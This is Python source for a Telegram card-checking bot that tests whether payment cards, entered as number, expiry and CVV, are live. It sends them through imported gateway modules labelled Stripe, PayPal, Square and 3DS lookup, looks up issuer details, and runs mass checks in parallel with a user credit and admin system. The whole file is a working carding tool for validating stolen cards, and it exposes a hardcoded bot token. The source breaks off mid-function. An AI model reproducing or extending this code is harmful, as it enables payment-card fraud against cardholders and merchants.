import telebot
import requests
import json
import time
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import threading
import concurrent.futures
import re
from datetime import datetime, timedelta
import os
from urllib.parse import urlparse

from telebot import types
import html  # ✅ For escaping unsafe characters
from datetime import datetime, timedelta, timezone
import psutil
import platform
import io
import subprocess
import sys

from yt_dlp import YoutubeDL
import random
import string


import schedule 
from faker import Faker
from faker.config import AVAILABLE_LOCALES



#====================Gateway Files===================================#
from chk import check_card
from au import process_card_au
from at import process_card_at
from vbv import check_vbv_card
from py import check_paypal_card
from qq import check_qq_card
from cc import process_cc_card
#====================================================================#

# Bot token
BOT_TOKEN = "8140466625:AAHofK8GP_BWm2zoardBo9xOol_ij4j9swc"
bot = telebot.TeleBot(BOT_TOKEN)
import bleach
import telebot

ALLOWED_TAGS = ['b', 'i', 'u', 'a', 'code', 'pre']
ALLOWED_ATTRIBUTES = {
    'a': ['href', 'title']
}

def sanitize_html(text: str) -> str:
    if not isinstance(text, str):
        text = str(text)
    return bleach.clean(
        text,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )

# Save originals before patching
_original_send_message = telebot.TeleBot.send_message
_original_edit_message_text = telebot.TeleBot.edit_message_text

def send_message_wrapper(self, chat_id, text, *args, **kwargs):
    if kwargs.get("parse_mode") == "HTML" and text:
        text = sanitize_html(text)
    return _original_send_message(self, chat_id, text, *args, **kwargs)

def edit_message_text_wrapper(self, text, chat_id=None, message_id=None, *args, **kwargs):
    if kwargs.get("parse_mode") == "HTML" and text:
        text = sanitize_html(text)
    return _original_edit_message_text(self, text, chat_id=chat_id, message_id=message_id, *args, **kwargs)

# Patch the bot
telebot.TeleBot.send_message = send_message_wrapper
telebot.TeleBot.edit_message_text = edit_message_text_wrapper


# Configuration
OWNER_ID = 7098912960  # Replace with your Telegram ID
ADMIN_IDS = ["7763891494", "7098912960"]  # Replace with admin Telegram IDs
USER_DATA_FILE = "users.json"
GROUP_DATA_FILE = "groups.json"
DAILY_CREDITS = 100  # Daily credits for non-subscribed users
CREDIT_RESET_INTERVAL = 3600  # 1 hour in seconds
CREDITS_PER_HOUR = 100  # Credits per hour
MAX_MASS_CHECK = 10  # Max cards per mass check

FIREBASE_BASE_URL = 'https://void-checker-default-rtdb.firebaseio.com'




BOT_START_TIME = time.time()
import html

def escape_html(text):
    if not isinstance(text, str):
        text = str(text)
    return html.escape(text, quote=False)



def safe_html(text):
    return escape_html(text)


def read_firebase(path):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.get(url)
        if res.status_code == 200:
            return res.json() or {}
    except:
        return {}
    return {}

def write_firebase(path, data):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.put(url, json=data)
        return res.status_code == 200
    except:
        return False

def update_firebase(path, data):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.patch(url, json=data)
        return res.status_code == 200
    except:
        return False


ADMINS_FILE = "admins.json"


def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, "r") as f:
            return set(json.load(f))
    return set(["7098912960"])  # fallback default

def save_admins():
    with open(ADMINS_FILE, "w") as f:
        json.dump(list(ADMIN_IDS), f)

# Load all data from Firebase at startup
USER_CREDITS = read_firebase("user_credits") or {}
SUBSCRIBED_USERS = read_firebase("subscribed_users") or {}
APPROVED_GROUPS = set(read_firebase("approved_groups") or {})
REDEEM_CODES = read_firebase("redeem_codes") or {}
BANNED_USERS = read_firebase("banned_users") or {}

# New way
APPROVED_GROUPS = set(read_firebase("approved_groups") or {})

# New way saving
write_firebase("approved_groups", list(APPROVED_GROUPS))

def get_remaining_credits(user_id):
    user_id_str = str(user_id)
    USER_CREDITS = read_firebase("user_credits")

    if user_id_str in USER_CREDITS:
        return USER_CREDITS[user_id_str].get('credits', DAILY_CREDITS)

    return DAILY_CREDITS


# Load user credits from Firebase
USER_CREDITS = {}

def load_user_credits():
    global USER_CREDITS
    USER_CREDITS = read_firebase("user_credits")

# Call this once at startup
load_user_credits()


# Load redeem codes
# New way
REDEEM_CODES = read_firebase("redeem_codes") or {}

# New way saving
write_firebase("redeem_codes", REDEEM_CODES)

# User flood control
USER_LAST_COMMAND = {}
USER_MASS_CHECK_COOLDOWN = {}

# Decline responses for B3
DECLINE_RESPONSES = [
    "Do Not Honor",
    "Closed Card",
    "Card Issuer Declined CVV",
    "Call Issuer. Pick Up Card.",
    "2108: Closed Card (51 : DECLINED)",
    "Processor Declined",
    "Credit card type is not accepted by this merchant account.",
    "Expired Card",
    "Transaction Not Allowed",
    "RISK: Retry this BIN later.",
    "CVV.",
    "Invalid postal code and cvv",
    "Cannot Authorize at this time (Policy)"
]

SUBSCRIBED_USERS = read_firebase("subscribed_users")

write_firebase("subscribed_users", SUBSCRIBED_USERS)

# Add these with other variables at the top
BANNED_USERS = {}
if os.path.exists('banned_users.json'):
    with open('banned_users.json', 'r') as f:
        BANNED_USERS = json.load(f)

# Load user data from file
import json, os

USERS_FILE = "users.json"

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            try:
                data = json.load(f)
                if isinstance(data, dict):
                    return data
                else:
                    return {}  # if file has int or list, reset
            except json.JSONDecodeError:
                return {}  # reset if file corrupted
    return {}

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=4)


# Load group data from file
def load_groups():
    try:
        with open(GROUP_DATA_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

# Save group data to file
def save_groups(groups):
    with open(GROUP_DATA_FILE, 'w') as f:
        json.dump(groups, f, indent=4)

# Initialize user data
def init_user(user_id, username=None):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            "credits": CREDITS_PER_HOUR,
            "last_reset": int(time.time()),
            "username": username,
            "total_checks": 0,
            "approved": 0,
            "declined": 0
        }
        save_users(users)

# Reset credits for all users
def reset_credits():
    while True:
        users = load_users()
        if not isinstance(users, dict):  # safety check
            users = {}

        for user_id in users:
            if int(time.time()) - users[user_id]["last_reset"] >= CREDIT_RESET_INTERVAL:
                users[user_id]["credits"] = CREDITS_PER_HOUR
                users[user_id]["last_reset"] = int(time.time())

        save_users(users)
        time.sleep(CREDIT_RESET_INTERVAL)


# Start credit reset thread
threading.Thread(target=reset_credits, daemon=True).start()

# Get user status
def get_user_status(user_id):
    if user_id == OWNER_ID:
        return "Owner"
    elif user_id in ADMIN_IDS:
        return "Admin"
    else:
        return "User"

# Get user credits
def get_user_credits(user_id):
    users = load_users()
    return users.get(str(user_id), {}).get("credits", 0)

# Deduct user credits
def deduct_credits(user_id, amount):
    users = load_users()
    if str(user_id) in users and users[str(user_id)]["credits"] >= amount:
        users[str(user_id)]["credits"] -= amount
        save_users(users)
        return True
    return False

# Add this near the top with other constants
USER_SITES_FILE = "user_sites.json"

# Add this with other initialization code 𝐃𝐞𝐯
USER_SITES = {}
if os.path.exists(USER_SITES_FILE):
    with open(USER_SITES_FILE, 'r') as f:
        USER_SITES = json.load(f)

def save_user_sites():
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(USER_SITES, f)

# Status texts and emojis (add with other status constants)
status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '❎',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}

# Get BIN info
def get_bin_info(bin_number):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': data.get('bin', ''),
                'brand': data.get('brand', 'None'),
                'country': data.get('country_name', 'None'),
                'country_flag': data.get('country_flag', ''),
                'bank': data.get('bank', 'None'),
                'type': data.get('type', 'None'),
                'level': data.get('level', 'None')
            }
        return None
    except:
        return None

# Format for checking status
def checking_status_format(cc, gateway, bin_info):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
┏━━━━━━━⍟</a>
┃ ↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠</a>
┗━━━━━━━━━━━⊛</a>

[⸙]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{cc}</code>
[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>Processing</i>
──────── ⸙ ─────────</a>
[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ➳ {bin_info.get('brand', 'UNKNOWN')}
[⸙]</a> 𝐁𝐚𝐧𝐤 ➳ {bin_info.get('bank', 'UNKNOWN')}
[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
──────── ⸙ ─────────</a>"""
    return result

# Format the check result for approved status
def approved_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
┏━━━━━━━⍟</a>
┃ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</a>
┗━━━━━━━━━━━⊛</a>

[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{cc}</code>
[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{response}</i>
──────── ⸙ ─────────</a>
[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {bin_info.get('brand', 'UNKNOWN')}
[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {bin_info.get('bank', 'UNKNOWN')}
[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
──────── ⸙ ─────────</a>
[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {Userstatus} ]
[⸙]</a> 𝐃𝐞𝐯 ⌁ xX_Naman_Xx
[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
    return result

# Format the check result for declined status
def declined_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
┏━━━━━━━⍟</a>
┃ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</a>
┗━━━━━━━━━━━⊛</a>

[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{cc}</code>
[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{response}</i>
──────── ⸙ ─────────</a>
[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {bin_info.get('brand', 'UNKNOWN')}
[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {bin_info.get('bank', 'UNKNOWN')}
[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
──────── ⸙ ─────────</a>
[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {Userstatus} ]
[⸙]</a> 𝐃𝐞𝐯 ⌁ xX_Naman_Xx
[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
    return result

# Single check format function
def single_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken, status):
    if status.upper() == "APPROVED":
        return approved_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken)
    else:
        return declined_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken)

# Check if user has enough credits
def check_credits(user_id, amount=1):
    users = load_users()
    if str(user_id) not in users or users[str(user_id)]["credits"] < amount:
        return False
    return True

# Deduct credits for a check
def use_credits(user_id, amount=1):
    if check_credits(user_id, amount):
        deduct_credits(user_id, amount)
        return True
    return False

# Format for mass check
STATUS_EMOJIS = {
    'APPROVED': '✅',
    'Approved': '✅',
    'DECLINED': '❌',
    'Declined': '❌',
    'CCN': '🟡',
    'ERROR': '⚠️',
    'Error': '⚠️'
}

def format_mass_check(results, total_cards, processing_time, gateway, checked=0):
    approved = sum(1 for r in results if r['status'].upper() in ['APPROVED', 'APPROVED'])
    ccn = sum(1 for r in results if r['status'].upper() == 'CCN')
    declined = sum(1 for r in results if r['status'].upper() in ['DECLINED', 'DECLINED'])
    errors = sum(1 for r in results if r['status'].upper() in ['ERROR', 'ERROR'])

    response = f"""↯  𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</a>

[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 ⌁ <i>{checked}/{total_cards}</i>
[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
[⸙]</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ⌁ <i>{approved}</i>
[⸙]</a> 𝐂𝐂𝐍 ⌁ <i>{ccn}</i>
[⸙]</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ⌁ <i>{declined}</i>
[⸙]</a> 𝐓𝐢𝐦𝐞 ⌁ <i>{processing_time:.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</i>
──────── ⸙ ─────────</a>
"""

    for result in results:
        status_key = result['status'].upper()
        emoji = STATUS_EMOJIS.get(status_key, '❓')
        if status_key not in STATUS_EMOJIS:
            if 'APPROVED' in status_key:
                emoji = '✅'
            elif 'DECLINED' in status_key:
                emoji = '❌'
            elif 'ERROR' in status_key:
                emoji = '⚠️'
            else:
                emoji = '❓'
        response += f"<code>{result['card']}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬 ⌁ {emoji} <i>{result['response']}</i>\n──────── ⸙ ─────────</a>\n"
    return response

def format_mass_check_processing(total_cards, checked, gateway):
    return f"""↯  𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</a>

[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 ⌁ <i>{checked}/{total_cards}</i>
[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
[⸙]</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ⌁ <i>0</i>
[⸙]</a> 𝐂𝐂𝐍 ⌁ <i>0</i>
[⸙]</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ⌁ <i>0</i>
[⸙]</a> 𝐓𝐢𝐦𝐞 ⌁ <i>0.00 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</i>
──────── ⸙ ─────────</a>
Processing cards...</a>"""

# Handle /chk command
@bot.message_handler(commands=['chk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.chk'))
def handle_chk(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Stripe Auth 2th", bin_info)
    import html
    status_message = bot.reply_to(message, safe_html(checking_msg), parse_mode='HTML')
    start_time = time.time()
    check_result = check_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /au command
@bot.message_handler(commands=['au'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.au'))
def handle_au(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Stripe Auth 2", bin_info)
    import html
    status_message = bot.reply_to(message, safe_html(checking_msg), parse_mode='HTML')
    start_time = time.time()
    check_result = process_card_au(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /mass command
@bot.message_handler(commands=['mass'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mass'))
def handle_mass(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"<pre>↯ Starting Mass Stripe Auth Check of {len(cards)} Cards... </pre>"
        status_message = bot.reply_to(message, initial_msg, parse_mode='HTML')

        try:
            first_card_result = process_card_au(cards[0])
            gateway = first_card_result.get("gateway", "Stripe Auth 2")
        except:
            gateway = "Stripe Auth 2"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(process_card_au, card): card for card in cards}
                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            results.append({
                                'card': card,
                                'status': result['status'],
                                'response': result['response'],
                                'gateway': result.get('gateway', 'Stripe Auth 2')
                            })
                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        current_time = time.time() - start_time
                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_message.message_id,
                            text=progress_msg,
                            parse_mode='HTML'
                        )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass AU check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mchk command
@bot.message_handler(commands=['mchk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mchk'))
def handle_mchk(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"<pre>↯ Starting Mass Stripe Auth Check of {len(cards)} Cards... </pre>"
        status_message = bot.reply_to(message, initial_msg, parse_mode='HTML')

        try:
            first_card_result = check_card(cards[0])
            gateway = first_card_result.get("gateway", "Stripe Auth 2th")
        except:
            gateway = "Stripe Auth 2th"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(check_card, card): card for card in cards}
                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            results.append({
                                'card': card,
                                'status': result['status'],
                                'response': result['response'],
                                'gateway': result.get('gateway', 'Stripe Auth 2th')
                            })
                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        current_time = time.time() - start_time
                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_message.message_id,
                            text=progress_msg,
                            parse_mode='HTML'
                        )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /vbv command
@bot.message_handler(commands=['vbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.vbv'))
def handle_vbv(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "3DS Lookup", bin_info)
    import html
    status_message = bot.reply_to(message, safe_html(checking_msg), parse_mode='HTML')
    start_time = time.time()
    check_result = check_vbv_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /py command
@bot.message_handler(commands=['py'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.py'))
def handle_py(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Paypal [0.1$]", bin_info)
    import html
    status_message = bot.reply_to(message, safe_html(checking_msg), parse_mode='HTML')
    start_time = time.time()
    check_result = check_paypal_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /qq command
@bot.message_handler(commands=['qq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.qq'))
def handle_qq(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Stripe Square [0.20$]", bin_info)
    import html
    status_message = bot.reply_to(message, safe_html(checking_msg), parse_mode='HTML')
    start_time = time.time()
    check_result = check_qq_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /cc command
@bot.message_handler(commands=['cc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.cc'))
def handle_cc(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Site Based [1$]", bin_info)
    import html
    status_message = bot.reply_to(message, safe_html(checking_msg), parse_mode='HTML')
    start_time = time.time()
    check_result = process_cc_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /mvbv command
@bot.message_handler(commands=['mvbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mvbv'))
def handle_mvbv(message):
    user_id = message.from_user.id
